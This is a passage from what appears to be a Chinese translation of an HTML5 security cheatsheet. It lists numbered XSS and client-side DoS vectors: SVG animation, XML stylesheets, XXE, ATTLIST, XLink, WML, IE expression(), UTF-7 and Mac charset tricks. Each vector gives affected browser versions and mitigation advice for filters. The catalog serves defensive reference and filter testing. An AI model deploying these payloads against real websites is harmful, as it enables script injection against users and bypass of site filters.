<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg&#62; &#60;a xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; xlink:href=&#34;?&#34;&#62; &#60;circle r=&#34;400&#34;&#62;&#60;/circle&#62; &#60;animate attributeName=&#34;xlink:href&#34; begin=&#34;0&#34; from=&#34;javascript:alert(1)&#34; to=&#34;&#38;&#34; /&#62; &#60;/a&#62;</span><br></pre></td></tr></table></figure>
<p>Avoid inline-SVG in combination with user-generated content. In case SVG needs to be used, avoid potentially harmful content for “to”, “from”, “values” and “by” attributes.</p>
<ul>
<li>firefox 25.0</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 15.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 30.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>html5</p>
</li>
<li>svg</li>
<li>from</li>
<li>inline</li>
<li>xss</li>
<li><p>passive</p>
</li>
<li><p><a href="http://jsbin.com/uxadon/3" target="_blank" rel="external">http://jsbin.com/uxadon/3</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVG/animate.html#FromAttribute" target="_blank" rel="external">http://www.w3.org/TR/SVG/animate.html#FromAttribute</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Executing_JavaScript_using_ES6_Template_Strings_in_SVG#141test">Executing JavaScript using ES6 Template Strings in SVG<a href="#141">#141</a><a href="test/#141">test</a></h3><p>The new language features shown in #140 can also be used in the context of an SVG image. Here, the named entity of the back-tick, the &DiacriticalGrave; can be used to initiate execution of a function or method.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;svg&#62;&#60;script&#62; alert&#38;DiacriticalGrave;1&#38;DiacriticalGrave; &#60;p&#62; &#60;svg&#62;&#60;script&#62; alert&#38;grave;1&#38;grave; &#60;p&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure that your IDS, filter and other protective systems are aware of the fact, that in SVG, HTML-encoded back-ticks (U+0060) are now capable of initiating execution of methods and functions in JavaScript.</p>
<ul>
<li>firefox 34.0</li>
<li><p>firefox latest</p>
</li>
<li><p>es6</p>
</li>
<li>javascript</li>
<li>backtick</li>
<li>template</li>
<li><p>svg</p>
</li>
<li><p><a href="http://tc39wiki.calculist.org/es6/template-strings/" target="_blank" rel="external">http://tc39wiki.calculist.org/es6/template-strings/</a></p>
</li>
<li><a href="https://html5sec.org/es6/template" target="_blank" rel="external">https://html5sec.org/es6/template</a></li>
<li><a href="http://wiki.ecmascript.org/doku.php?id=harmony:quasis" target="_blank" rel="external">http://wiki.ecmascript.org/doku.php?id=harmony:quasis</a></li>
</ul>
<p>reporter：.mario</p>
<h2 id="X(HT)ML相关向量">X(HT)ML相关向量</h2><h3 id="通过Opera_XML-stylesheets执行JavaScript#17test">通过Opera XML-stylesheets执行JavaScript<a href="#17">#17</a><a href="test/#17">test</a></h3><p>Opera 9.x和10.0允许XML-stylesheets使用Javascript URI.这个向量在mime-type是text/html的情况下是也有效的.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml-stylesheet href=&#34;javascript:alert(1)&#34;?&#62;&#60;root/&#62;</span><br></pre></td></tr></table></figure>
<p>确保用户输入的没有包含XML stylesheets或者只允许能被&lt;\w+匹配的标签 - 因为这个向量需要&lt;\?\w+才能匹配.黑名单是有可能被绕过的.</p>
<ul>
<li>opera 9.x</li>
<li><p>opera 10.10</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>xml</li>
<li>css</li>
<li>proprietary</li>
</ul>
<p>reporter：.mario</p>
<h3 id="&lt;SCRIPT&gt;和其它类似标签内的Entities#18test">&lt;SCRIPT&gt;和其它类似标签内的Entities<a href="#18">#18</a><a href="test/#18">test</a></h3><p>By specification user agents allow using HTML entities between &lt;SCRIPT&gt; and &lt;STYLE&gt; tags in case the document is being delivered and rendered as X(HT)ML.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&#62;&#38;#x61;l&#38;#x65;rt&#38;#40;1)&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p>确保过滤器或其它检测系统考虑了&lt;script&gt;或&lt;style&gt;和其它标签之间允许有Entities的事实.而不仅仅是属性.</p>
<ul>
<li>opera 8.x</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>internet explorer</li>
<li>firefox</li>
<li>chrome</li>
<li>safari</li>
<li>xml</li>
<li>entity</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Arbitrary_payload_injection_via_XML_External_Entities_(XXE)#64test">Arbitrary payload injection via XML External Entities (XXE)<a href="#64">#64</a><a href="test/#64">test</a></h3><p>Chrome and Safari allow using external XML entities to reference payload for an entity. The example shows that the entity &x; is now being filled with the content of the given file. The document must be delivered as XML or XHTML. Note that the absolute URL for the source of XXE is required.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!DOCTYPE x[&#60;!ENTITY x SYSTEM &#34;http://html5sec.org/test.xxe&#34;&#62;]&#62;&#60;y&#62;&#38;x;&#60;/y&#62;</span><br></pre></td></tr></table></figure>
<p>In case an attacker can inject data into the DOCTYPE area of the targeted website it’s easy to fool filtering mechanisms since the actual payload is hidden in a harmless looking entity. Make sure no injections in that area are possible.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&#62;alert(1)&#60;/script&#62;crossdomain: 0path: [http://html5sec.org/test.xxe](http://html5sec.org/test.xxe)name: test.xxe</span><br></pre></td></tr></table></figure>
<ul>
<li>chrome 3.0</li>
<li><p>chrome latest</p>
</li>
<li><p>opera 16.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>xxe</li>
<li>safari</li>
<li>chrome</li>
<li>xml</li>
<li>entities</li>
<li><p>doctype</p>
</li>
<li><p><a href="http://xmlwriter.net/xml_guide/entity_declaration.shtml" target="_blank" rel="external">http://xmlwriter.net/xml_guide/entity_declaration.shtml</a></p>
</li>
<li><a href="http://www.w3.org/TR/REC-xml/" target="_blank" rel="external">http://www.w3.org/TR/REC-xml/</a></li>
<li><a href="#67">#67</a></li>
<li><a href="#76">#76</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Opera_XML-stylesheets_executing_JavaScript_(2)#66test">Opera XML-stylesheets executing JavaScript (2)<a href="#66">#66</a><a href="test/#66">test</a></h3><p>Opera supports xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = “#xss”), when the stylesheet implemented in the current document.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml version=&#34;1.0&#34;?&#62; &#60;?xml-stylesheet type=&#34;text/xsl&#34; href=&#34;data:,%3Cxsl:transform version=&#39;1.0&#39; xmlns:xsl=&#39;http://www.w3.org/1999/XSL/Transform&#39; id=&#39;xss&#39;%3E%3Cxsl:output method=&#39;html&#39;/%3E%3Cxsl:template match=&#39;/&#39;%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E&#34;?&#62; &#60;root/&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 8.0</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>xslt</li>
<li>xsl</li>
<li>stylesheet</li>
<li>xml</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="XML_ATTLIST_declaration_causing_JavaScript_execution#67test">XML ATTLIST declaration causing JavaScript execution<a href="#67">#67</a><a href="test/#67">test</a></h3><p>XML ATTLIST declarations can be used to create attributes and assign values for matching tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it’s possible to create an ATTLIST declaration causing JavaScript execution without user interaction.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!DOCTYPE x [ &#60;!ATTLIST img xmlns CDATA &#34;http://www.w3.org/1999/xhtml&#34; src CDATA &#34;xx:x&#34; onerror CDATA &#34;alert(1)&#34; onload CDATA &#34;alert(2)&#34;&#62; ]&#62;&#60;img /&#62;</span><br></pre></td></tr></table></figure>
<p>In case a website is being delivered as XML or XHTML make sure an attacker has no possibility to inject data into the DOCTYPE or create new ATTLIST directives.</p>
<ul>
<li>chrome 4.0</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>firefox 3.0</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 8.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>attlist</li>
<li>doctype</li>
<li>chrome</li>
<li>firefox</li>
<li><p>safari</p>
</li>
<li><p><a href="http://xmlwriter.net/xml_guide/attlist_declaration.shtml" target="_blank" rel="external">http://xmlwriter.net/xml_guide/attlist_declaration.shtml</a></p>
</li>
<li><a href="#64">#64</a></li>
<li><a href="#76">#76</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Passive_JavaScript_execution_via_XLinks#68test">Passive JavaScript execution via XLinks<a href="#68">#68</a><a href="test/#68">test</a></h3><p>Gecko based browsers like Firefox allow using XLinks. Those can be equipped with a JavaScript URI to execute JavaScript in case the user clicks on one of those XLinks.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;doc xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; xmlns:html=&#34;http://www.w3.org/1999/xhtml&#34;&#62; &#60;html:style /&#62;&#60;x xlink:href=&#34;javascript:alert(1)&#34; xlink:type=&#34;simple&#34;&#62;XXX&#60;/x&#62; &#60;/doc&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 3.0</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>xlink</li>
<li>firefox</li>
<li><p>xml</p>
</li>
<li><p><a href="http://www.w3.org/TR/xlink/" target="_blank" rel="external">http://www.w3.org/TR/xlink/</a></p>
</li>
<li><a href="http://www.w3.org/TR/2010/REC-xlink11-20100506/" target="_blank" rel="external">http://www.w3.org/TR/2010/REC-xlink11-20100506/</a></li>
<li><a href="#81">#81</a></li>
<li><a href="#87">#87</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Opera_WML_JavaScript_execution_via_timer_event#69test">Opera WML JavaScript execution via timer event<a href="#69">#69</a><a href="test/#69">test</a></h3><p>Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it’s a WML and renders it accordingly. With a timer event and a connected redirect it’s possible to execute JavaScript without user interaction.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;card xmlns=&#34;http://www.wapforum.org/2001/wml&#34;&#62;&#60;onevent type=&#34;ontimer&#34;&#62;&#60;go href=&#34;javascript:alert(1)&#34;/&#62;&#60;/onevent&#62;&#60;timer value=&#34;1&#34;/&#62;&#60;/card&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 9.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>wmlscript</li>
<li>wml</li>
<li>opera</li>
<li>mobile</li>
<li><p>timer</p>
</li>
<li><p><a href="http://www.w3schools.com/wap/default.asp" target="_blank" rel="external">http://www.w3schools.com/wap/default.asp</a></p>
</li>
<li><a href="http://www.w3schools.com/wmlscript/default.asp" target="_blank" rel="external">http://www.w3schools.com/wmlscript/default.asp</a></li>
<li><a href="#83">#83</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Arbitrary_payload_injection_via_XML_external_DTD_in_IE#76test">Arbitrary payload injection via XML external DTD in IE<a href="#76">#76</a><a href="test/#76">test</a></h3><p>IE will render doctype-provided entities in the “html” namespace as soon as a user defined XML stylesheet tag is present. The example works up to IE8 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml-stylesheet type=&#34;text/css&#34;?&#62;&#60;!DOCTYPE x SYSTEM &#34;test.dtd&#34;&#62;&#60;x&#62;&#38;x;&#60;/x&#62;``&#60;!ENTITY x &#34;&#38;#x3C;html:img&#38;#x20;src=&#39;x&#39;&#38;#x20;xmlns:html=&#39;http://www.w3.org/1999/xhtml&#39;&#38;#x20;onerror=&#39;alert(1)&#39;/&#38;#x3E;&#34;&#62;crossdomain: 1path: [http://html5sec.org/test.dtd](http://html5sec.org/test.dtd)name: test.dtd</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>xml</li>
<li>dtd</li>
<li><p>arbitrary</p>
</li>
<li><p><a href="#64">#64</a></p>
</li>
<li><a href="#67">#67</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="XML_JavaScript_execution_via_style_attribute_in_IE#77test">XML JavaScript execution via style attribute in IE<a href="#77">#77</a><a href="test/#77">test</a></h3><p>IE supports the style attribute in xml-pages too. Thus JavaScript can be executed via expression() with any given tag. The example works up to IE 7 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml-stylesheet type=&#34;text/css&#34;?&#62;&#60;root style=&#34;x:expression(write(1))&#34;/&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>xml</li>
<li>css</li>
<li>style</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Arbitrary_payload_injection_via_XSL_+_XDR-schema_in_IE#78test">Arbitrary payload injection via XSL + XDR-schema in IE<a href="#78">#78</a><a href="test/#78">test</a></h3><p>The namespace “html” is automatically determined using XSL. Missing attributes for the &lt;img&gt; tag such as “onerror” are obtained from the XDR-schema - and will then execute JavaScript. The example works up to IE 8 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml-stylesheet type=&#34;text/xsl&#34; href=&#34;#&#34;?&#62;&#60;img xmlns=&#34;x-schema:test.xdr&#34;/&#62;``&#60;?xml version=&#34;1.0&#34;?&#62; &#60;Schema name=&#34;x&#34; xmlns=&#34;urn:schemas-microsoft-com:xml-data&#34;&#62; &#60;ElementType name=&#34;img&#34;&#62; &#60;AttributeType name=&#34;src&#34; required=&#34;yes&#34; default=&#34;x&#34;/&#62; &#60;AttributeType name=&#34;onerror&#34; required=&#34;yes&#34; default=&#34;alert(1)&#34;/&#62; &#60;attribute type=&#34;src&#34;/&#62; &#60;attribute type=&#34;onerror&#34;/&#62; &#60;/ElementType&#62; &#60;/Schema&#62;crossdomain: 1path: [http://html5sec.org/test.xdr](http://html5sec.org/test.xdr)name: test.xdr</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>xml</li>
<li>xdr</li>
<li>arbitrary</li>
<li>xml data reduced</li>
<li><p>xsl</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx</a>.aspx)</p>
</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Active_JavaScript_execution_via_XLink#81test">Active JavaScript execution via XLink<a href="#81">#81</a><a href="test/#81">test</a></h3><p>FF supports the “xlink:actuate” attribute and allows displaying XML link without additional styles. The default namespace here is “html”.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;x xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; xlink:actuate=&#34;onLoad&#34; xlink:href=&#34;javascript:alert(1)&#34; xlink:type=&#34;simple&#34;/&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 3.0</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>xlink</li>
<li>firefox</li>
<li><p>xml</p>
</li>
<li><p><a href="http://www.w3.org/TR/xlink/#actuate-att" target="_blank" rel="external">http://www.w3.org/TR/xlink/#actuate-att</a></p>
</li>
<li><a href="http://www.w3.org/TR/2010/REC-xlink11-20100506/" target="_blank" rel="external">http://www.w3.org/TR/2010/REC-xlink11-20100506/</a></li>
<li><a href="#68">#68</a></li>
<li><a href="#87">#87</a></li>
</ul>
<p>reporter：LeverOne, .mario</p>
<h3 id="JavaScript_execution_via_XML_stylesheet,_data_URI_and_expression()#82test">JavaScript execution via XML stylesheet, data URI and expression()<a href="#82">#82</a><a href="test/#82">test</a></h3><p>Internet Explorer 8 to 10 support data URIs and thus are capable of including stylesheets this way. By using a xml stylesheet tag and a data URI containing an expression() it’s possible to execute JavaScript without user interaction.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml-stylesheet type=&#34;text/css&#34; href=&#34;data:,*%7bx:expression(write(2));%7d&#34;?&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 8.0</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>xml stylesheet</li>
<li>css</li>
<li>internet explorer</li>
<li>expression</li>
<li><p>xml</p>
</li>
<li><p><a href="http://www.w3.org/TR/xml-stylesheet/" target="_blank" rel="external">http://www.w3.org/TR/xml-stylesheet/</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Obfuscated_WML_injection_via_undeclared_WAP-ML_Variables#83test">Obfuscated WML injection via undeclared WAP-ML Variables<a href="#83">#83</a><a href="test/#83">test</a></h3><p>The example demonstrates the use in WML undeclared variables (are ignored). These variables can be declared in the tags &lt;setvar&gt;, &lt;input&gt;, &lt;select&gt;. Namespace indicated for use inside the XML-file. Also inside WML-files can you use a lot of regular HTML-tags.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;x:template xmlns:x=&#34;http://www.wapforum.org/2001/wml&#34; x:ontimer=&#34;$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)&#34;&#62;&#60;x:timer value=&#34;1&#34;/&#62;&#60;/x:template&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 9.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>wml</li>
<li>opera</li>
<li>mobile</li>
<li>timer</li>
<li><p>variable</p>
</li>
<li><p><a href="http://www.w3schools.com/wap/wml_variables.asp" target="_blank" rel="external">http://www.w3schools.com/wap/wml_variables.asp</a></p>
</li>
<li><a href="#69">#69</a></li>
</ul>
<p>reporter：LeverOne, .mario</p>
<h3 id="Opera_JavaScript_execution_via_XML-events_handler#84test">Opera JavaScript execution via XML-events handler<a href="#84">#84</a><a href="test/#84">test</a></h3><p>The browser tries to load an external XML-event handler and execute JavaScript without user interaction. The problem seems to be fixed in Opera 11.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;x xmlns:ev=&#34;http://www.w3.org/2001/xml-events&#34; ev:event=&#34;load&#34; ev:handler=&#34;javascript:alert(1)//#x&#34;/&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 9.x</li>
<li><p>opera 11.01</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>event</li>
<li><p>handler</p>
</li>
<li><p><a href="http://www.w3.org/TR/xml-events/" target="_blank" rel="external">http://www.w3.org/TR/xml-events/</a></p>
</li>
<li><a href="#85">#85</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Arbitrary_payload_injection_in_Opera_via_XML-events_handler#85test">Arbitrary payload injection in Opera via XML-events handler<a href="#85">#85</a><a href="test/#85">test</a></h3><p>The browser loads an external xml-event handler, which contains the JavaScript code. This example also works with data URIs.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;x xmlns:ev=&#34;http://www.w3.org/2001/xml-events&#34; ev:event=&#34;load&#34; ev:handler=&#34;test.evt#x&#34;/&#62;``&#60;script xmlns=&#34;http://www.w3.org/1999/xhtml&#34; id=&#34;x&#34;&#62;alert(1)&#60;/script&#62;crossdomain: 1path: [http://html5sec.org/test.evt](http://html5sec.org/test.evt)name: test.evt</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 9.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>event</li>
<li>handler</li>
<li><p>arbitrary</p>
</li>
<li><p><a href="http://www.w3.org/TR/xml-events/" target="_blank" rel="external">http://www.w3.org/TR/xml-events/</a></p>
</li>
<li><a href="#94">#94</a></li>
<li><a href="#104">#104</a></li>
<li><a href="#127">#127</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Executing_JavaScript_with_WD-XSL,_&lt;eval&gt;_elements_and_“expr”_attributes#135test">Executing JavaScript with WD-XSL, &lt;eval&gt; elements and “expr” attributes<a href="#135">#135</a><a href="test/#135">test</a></h3><p>Internet Explorer, when loading an XML document in an older document mode, allows the use of a legacy XSL version called WD-XSL. This version, shipped with several proprietary extras, allows execution of JavaScript and other script code in very uncommon ways. The browser for instance supports an &lt;eval&gt; element and “expr” attributes that can directly be fed with script code or references to existing JavaScript and XMLDOM methods. Other than MSXSL script, direct DOM access is possible with the use of WD-XSL.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml-stylesheet type=&#34;text/xsl&#34; href=&#34;#&#34; ?&#62; &#60;stylesheet xmlns=&#34;http://www.w3.org/TR/WD-xsl&#34;&#62; &#60;template match=&#34;/&#34;&#62; &#60;eval&#62;new ActiveXObject(&#38;apos;htmlfile&#38;apos;).parentWindow.alert(1)&#60;/eval&#62; &#60;if expr=&#34;new ActiveXObject(&#39;htmlfile&#39;).parentWindow.alert(2)&#34;&#62;&#60;/if&#62; &#60;/template&#62; &#60;/stylesheet&#62;</span><br></pre></td></tr></table></figure>
<p>Websites rendered in XML- or XML-like MIME types should not allow untrusted input without heavy filtering. Unknown elements can cause unexpected script execution depending on browser and render mode. The use of custom namespaces in user generated input should be prohibited.</p>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>xslt</li>
<li>internet explorer</li>
<li>xml</li>
<li>wdxsl</li>
<li><p>legacy</p>
</li>
<li><p><a href="http://web.archive.org/web/20000816185012/http://msdn.microsoft.com/xml/reference/xsl/XSLElements.asp" target="_blank" rel="external">http://web.archive.org/web/20000816185012/http://msdn.microsoft.com/xml/reference/xsl/XSLElements.asp</a></p>
</li>
<li><a href="http://web.archive.org/web/20000816000901/http://msdn.microsoft.com/xml/reference/xsl/xslmethods.asp" target="_blank" rel="external">http://web.archive.org/web/20000816000901/http://msdn.microsoft.com/xml/reference/xsl/xslmethods.asp</a></li>
</ul>
<p>reporter：.mario</p>
<h2 id="UTF-7和其它诡异的编码集的向量">UTF-7和其它诡异的编码集的向量</h2><h3 id="通过x-imap4-modified-utf7编码进行XSS_(1)#2test">通过x-imap4-modified-utf7编码进行XSS (1)<a href="#2">#2</a><a href="test/#2">test</a></h3><p>这个向量说明UTF-7编码能产生很多你意想不到的XSS向量.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;meta charset=&#34;x-imap4-modified-utf7&#34;&#62;&#38;ADz&#38;AGn&#38;AG0&#38;AEf&#38;ACA&#38;AHM&#38;AHI&#38;AGO&#38;AD0&#38;AGn&#38;ACA&#38;AG8Abg&#38;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&#38;ACAAPABi</span><br></pre></td></tr></table></figure>
<p>确保没有被注入&lt;META&gt;标签,及网站已申明了上下文的编码方式.</p>
<ul>
<li>firefox 2.x</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>utf7</li>
<li>firefox</li>
<li>charset</li>
</ul>
<p>reporter：.mario</p>
<h3 id="通过x-imap4-modified-utf7编码进行XSS_(2)#3test">通过x-imap4-modified-utf7编码进行XSS (2)<a href="#3">#3</a><a href="test/#3">test</a></h3><p>这个向量说明UTF-7编码能产生很多你意想不到的XSS向量.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;meta charset=&#34;x-imap4-modified-utf7&#34;&#62;&#38;&#60;script&#38;S1&#38;TS&#38;1&#62;alert&#38;A7&#38;(1)&#38;R&#38;UA;&#38;&#38;&#60;&#38;A9&#38;11/script&#38;X&#38;&#62;</span><br></pre></td></tr></table></figure>
<p>确保没有被注入&lt;META&gt;标签,及网站已申明了上下文的编码方式.</p>
<ul>
<li>firefox 2.x</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>xss</p>
</li>
<li>utf7</li>
<li>firefox</li>
<li>charset</li>
</ul>
<p>reporter：.mario</p>
<h3 id="XSS_via_&amp;#188_and_&amp;#190_in_MacFarsi,_MacArabic_and_MacHebrew#19test">XSS via &amp;#188 and &amp;#190 in MacFarsi, MacArabic and MacHebrew<a href="#19">#19</a><a href="test/#19">test</a></h3><p>Buggy charset implementations in Firefox allow to craft HTML structures without using the usual characters such as &lt; and &gt;. Most affected charsets are from the Mac charset family - such as mac-farsi, mac-arabic and mac-hebrew.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;meta charset=&#34;x-mac-farsi&#34;&#62;?script ?alert(1)//?/script ?</span><br></pre></td></tr></table></figure>
<p>User input should never allow &lt;META&gt; tags to avoid re-setting the charset. In case the website is encoded in one of the affected charsets make sure to have your filter be aware that for Firefox &#60; (&lt;) and &#188; are equivalent - as well as other characters too.</p>
<ul>
<li>firefox 2.x</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>x-mac-arabic</p>
</li>
<li>x-mac-farsi</li>
<li>x-mac-hebrew</li>
<li>firefox</li>
<li><p>charset</p>
</li>
<li><p><a href="https://twitter.com/#!/hasegawayosuke/status/25984750035" target="_blank" rel="external">https://twitter.com/#!/hasegawayosuke/status/25984750035</a></p>
</li>
</ul>
<p>reporter：hasegawayosuke</p>
<h2 id="客户端DOS向量">客户端DOS向量</h2><h3 id="通过repeat_templates_DoS客户端#13test">通过repeat templates DoS客户端<a href="#13">#13</a><a href="test/#13">test</a></h3><p>这个向量是使用WebForms 2.0草案中的repeat template规范.利用嵌套一遍一遍的repeat标签本身,使用客户端崩溃.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;x repeat=&#34;template&#34; repeat-start=&#34;999999&#34;&#62;0&#60;y repeat=&#34;template&#34; repeat-start=&#34;999999&#34;&#62;1&#60;/y&#62;&#60;/x&#62;</span><br></pre></td></tr></table></figure>
<p>不要允许用户提交的HTML中包含repeat或repeat 或repeat-start、repeat-end属性.如果有这需求可以验证他们的值是否过大.</p>
<ul>
<li>opera 10.0</li>
<li><p>opera 10.10</p>
</li>
<li><p>dos</p>
</li>
<li>repeat</li>
<li>template</li>
<li>webforms</li>
<li>opera</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-forms/current-work/#repeatingFormControls" target="_blank" rel="external">http://www.whatwg.org/specs/web-forms/current-work/#repeatingFormControls</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="通过恶意的正则表达式DoS客户端#14test">通过恶意的正则表达式DoS客户端<a href="#14">#14</a><a href="test/#14">test</a></h3><p>Opera 10 支持使用pattern属性进行验证,如果正则表达式写的有问题,那么可能会导致”dossed”.</p>
